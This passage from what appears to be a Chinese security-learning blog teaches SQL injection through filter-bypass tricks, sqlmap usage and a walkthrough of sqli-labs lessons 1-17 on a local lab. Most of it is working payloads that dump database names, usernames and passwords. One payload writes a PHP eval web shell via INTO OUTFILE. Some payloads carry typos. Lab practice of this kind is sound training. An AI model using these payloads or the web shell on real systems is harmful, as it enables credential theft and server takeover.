id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>​         如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如：and过滤。当然这种过滤只是发现关键字出现。并不会对关键字进行处理。<br>​    通过修改关键字内字母大小写来绕过过滤措施。例如： AnD 1=1</p><p>​     例如，在进行探测当前表的字段数时，使用order by数字进行探测。如果过滤了order,可以使用OrdER来进行绕过。</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。</p><p>例如：过滤了union，我们可以使用ununionion进行绕过。</p><h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>可以利用网络中的URL在线编码，绕过SQL注入的过滤机制。</p><img src="QQ截图20200206143207.png" style="zoom:80%;" /><hr><h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>在Mysql中内联注释中的内容可以被当做SQL语句执行。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206143914.png" alt=""></p><h4 id="sqlmap基础使用方法"><a href="#sqlmap基础使用方法" class="headerlink" title="sqlmap基础使用方法"></a>sqlmap<strong>基础使用方法</strong></h4><h5 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><strong>sqlmap简介</strong></h5><p>​       sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p><p>​         sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p><p>sqlmap支持五种不同的注入模式：</p><ul><li>基于布尔的盲注：既可以根据返回页面判断条件真假的注入。</li></ul><p>​        向数据库发送true或false这样的问题，并根据应用程序赶回的信息判断结果、这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。</p><ul><li>基于时间的盲注:即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>联合查询注入：可以使用union的情况下的注入</li><li>堆查询注入：可以同时执行多条语句的执行时注入</li></ul><p><strong>sqlmap常用参数</strong></p><ul><li><p>-h -help显示基本帮助信息</p></li><li><p>-hh 显示高级帮助信息并退出</p></li><li><p>-u指定url</p></li><li><p>-p指定参数</p></li><li><p>-D指定数据库</p></li><li><p>-T指定表</p></li><li><p>-C指定字段</p></li><li><p>–current-db当前数据库</p></li><li><p>–current-user当前用户</p></li><li><p>–dbs查询所有数据库</p></li><li><p>–tables查询所有表</p></li><li><p>–columns查询所有字段名</p></li><li><p>–dump查询记录</p></li><li><p>–techniques X(X=B布尔型，E报错型，U联合注入型，T延时型）</p></li></ul><h4 id="sqli-labs靶场实战"><a href="#sqli-labs靶场实战" class="headerlink" title="sqli-labs靶场实战"></a>sqli-labs靶场实战</h4><h5 id="less-1-基于错误的GET单引号字符型注入）"><a href="#less-1-基于错误的GET单引号字符型注入）" class="headerlink" title="less-1 (基于错误的GET单引号字符型注入）"></a>less-1 (基于错误的GET单引号字符型注入）</h5><p><strong>注入过程：</strong></p><p>?id=1’ or 1=1 %23</p><p>?id=1’ order by 3 %23  #字段数为3</p><p>?id=1’ union select 1,2,3 #显示位为2，3</p><p><strong>爆库名</strong></p><p>?id=1’ union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23 </p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205184721.png" alt=""></p><p><strong>爆表名</strong></p><p>?id=1’ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)%23 </p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205184704.png" alt=""></p><p><strong>爆列名</strong></p><p>?id=1’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’user’) %23 </p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205184647.png" alt=""></p><p><strong>爆用户名和密码</strong></p><p>?id=1’ union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23  </p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205184623.png" alt=""></p><p><strong>使用sqlmap自动化探测</strong></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205190036.png" alt=""></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205190557.png" alt=""></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --batch</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205190649.png" alt=""></p><p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C password,username --dump --batch</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205192706.png" alt=""></p><h5 id="Less-2-（基于错误的GET整型注入）"><a href="#Less-2-（基于错误的GET整型注入）" class="headerlink" title="Less-2 （基于错误的GET整型注入）"></a>Less-2 （基于错误的GET整型注入）</h5><p>数字型注入，去掉单引号即可。</p><p>构造同Less-1</p><h5 id="Less-3-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3 （基于错误的GET单引号变形字符型注入）"></a>Less-3 （基于错误的GET单引号变形字符型注入）</h5><p>?id=1’) %23 回显正常</p><p>构造同Less-1</p><h5 id="Less-4（基于错误的GET双引号字符型注入）"><a href="#Less-4（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4（基于错误的GET双引号字符型注入）"></a>Less-4（基于错误的GET双引号字符型注入）</h5><p>?id=1”)%23 回显正常</p><p>构造同Less-01</p><h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p><p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select database()),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206132510.png" alt=""></p><p><strong>爆表名</strong></p><p>?id=1’ union select count(<em>),1, concat(‘<del>‘,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206132607.png" alt=""></p><p><strong>更换Limit后的数字即可查出其他表名</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206132652.png" alt=""></p><p><strong>爆user表列名</strong></p><p>?id=1’  union select count(*),1, concat(‘<del>‘,(select column_namefrom information_schema.tables where table_schema=’security’   and table_name=’users’ limit 0,1),’</del>‘,floor(rand()2)) as a from information_schema gruop by a %23</p><p><strong>爆username password内容</strong></p><p> ?id=1’union select count(<em>),1, concat(‘<del>‘,(select username from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206133237.png" alt=""></p><p>?id=1’union select count(<em>),1, concat(‘<del>‘,(select password from users limit 0,1),’</del>‘, floor(rand()</em>2)) as a from information_schema.tables group by a  %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206133320.png" alt=""></p><h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p><p>构造同上</p><h5 id="Less-7-导出文件GET字符型注入）"><a href="#Less-7-导出文件GET字符型注入）" class="headerlink" title="Less-7(导出文件GET字符型注入）"></a>Less-7(导出文件GET字符型注入）</h5><p>我们首先需要打开phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv=“/”。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206122518.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206120820.png" alt=""></p><p>我们需要用到两个函数：</p><p><strong>load_file()：</strong>读取本地文件</p><p><strong>into outfile()</strong> 写文件 （路径需要使用双斜线）</p><p>我们首先判断注入点：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206121046.png" alt=""></p><p>然后我们使用outfile函数将一句话木马写入文件。</p><pre class=" language-mysql"><code class="language-mysql">?id=-1')) union select 1,2,'<?php @eval($_POST["crow"]);?>' into outfile "D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php"</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206123636.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206123628.png" alt=""></p><p>之后我们使用中国菜刀连接即可。 </p><h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p><p>?id=1’ and (length(database())) = 8 %23 #数据库长度为8</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205195014.png" alt=""></p><p>我们任意修改长度，页面不回显</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205195102.png" alt=""></p><p><strong>爆库名</strong></p><p>?id=1’ and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</p><p>?id=1’and(ascii(substr((select database()),2,1)))=101 %23 #e</p><p>?id=1’and(ascii(substr((select database()),3,1)))=99 %23 #c</p><p>?id=1’ and (ascii(substr((select database()) ,4,1))) = 117 –+ #u</p><p>?id=1’ and (ascii(substr((select database()) ,5,1))) = 114 –+ #r</p><p>​    and (ascii(substr((select database()) ,6,1))) = 105 –+    #i</p><p> and (ascii(substr((select database()) ,7,1))) = 116 –+   #t</p><p>?id=1’ and (ascii(substr((select database()) ,8,1))) = 121 –+  #y</p><p><strong>爆表名长度</strong></p><p>?id=1’ and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</p><p>类推以上即可：</p><h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p>?id=1’ and sleep(5) %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205194242.png" alt=""></p><p>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205194753.png" alt=""></p><p>接下来使用sqlmap自动化注入</p><p><strong>爆数据库名：</strong></p><pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql --dbs --batch</code></pre><p><strong>爆表名：</strong></p><pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security --tables --batch </code></pre><p><strong>爆列名</strong>：</p><pre><code> python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users --column --batch</code></pre><p><strong>爆内容 ：</strong></p><pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code></pre><h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p>?id=1” and sleep(5) %23</p><p>同上</p><h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p><p>uname=admin’ and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206125708.png" alt=""></p><p>uname=admin’ and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</p><p><img src="%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt=""></p><p>存在报错型注入，我们使用extractvalue()函数。</p><p><strong>爆数据库</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206130037.png" alt=""></p><p><strong>爆表名</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206130124.png" alt=""></p><p><strong>爆列名</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=’users’),0x7e))%23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206130709.png" alt=""></p><p><strong>爆用户名密码</strong></p><p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200206130537.png" alt=""></p><p>sqlmap自动化注入：</p><p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p><h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p><p><strong>爆数据库名</strong>：</p><p>uname=admin” and extractvalue(1,concat(0x7e,(select database(),0x7e)))  “%23</p><p><strong>爆表名</strong>：</p><p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and “ </p><p><strong>爆列名</strong>：</p><p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’)))  and “<br><strong>爆用户名密码：</strong></p><p>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p><h5 id="Less-13-POST单引号变形双注入）"><a href="#Less-13-POST单引号变形双注入）" class="headerlink" title="Less-13(POST单引号变形双注入）"></a>Less-13(POST单引号变形双注入）</h5><p><strong>floor 报错注入</strong></p><p>1’) union select count(<em>),concat_ws(‘~’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p>1’) union select count(<em>),concat_ws(‘:’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p><strong>爆表名</strong></p><p>‘) union select count(<em>),concat_ws(‘++’,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p><strong>爆列名</strong></p><p>‘) union select count(<em>),concat_ws(‘+’,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><p><strong>爆数据</strong></p><p>‘) union select count(<em>),concat_ws(‘;’,(select username from users limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p><h5 id="Less-14-POST双引号变形双注入）"><a href="#Less-14-POST双引号变形双注入）" class="headerlink" title="Less-14(POST双引号变形双注入）"></a>Less-14(POST双引号变形双注入）</h5><p>将单引号闭合换成双引号即可。</p><p>过程同上。</p><h5 id="Less-15-基于bool型-时间延迟单引号POST型盲注）"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注）" class="headerlink" title="Less-15(基于bool型/时间延迟单引号POST型盲注）"></a>Less-15(基于bool型/时间延迟单引号POST型盲注）</h5><p>使用延时注入</p><p>admin’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) # </p><p>逐个判断即可；</p><h5 id="Less-16-基于bool型-时间延迟双引号POST型盲注）"><a href="#Less-16-基于bool型-时间延迟双引号POST型盲注）" class="headerlink" title="Less-16(基于bool型/时间延迟双引号POST型盲注）"></a>Less-16(基于bool型/时间延迟双引号POST型盲注）</h5><p>根据源码我们可以知道闭合方法： 使用”）进行闭合</p><p>使用延时注入</p><p>同上。</p><h5 id="Less-17-基于错误的更新查询POST注入）"><a href="#Less-17-基于错误的更新查询POST注入）" class="headerlink" title="Less-17(基于错误的更新查询POST注入）"></a>Less-17(基于错误的更新查询POST注入）</h5><p><strong>爆数据库版本</strong></p><p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</p><p><strong>爆表名</strong></p><p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x5c),1))#submit=submit</p><p><strong>爆字段名</strong></p><p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username=’admin’)aa),0x5c),1))#submit=submit</p><p><strong>未完待续。。。。</strong></p><h5 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h5>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
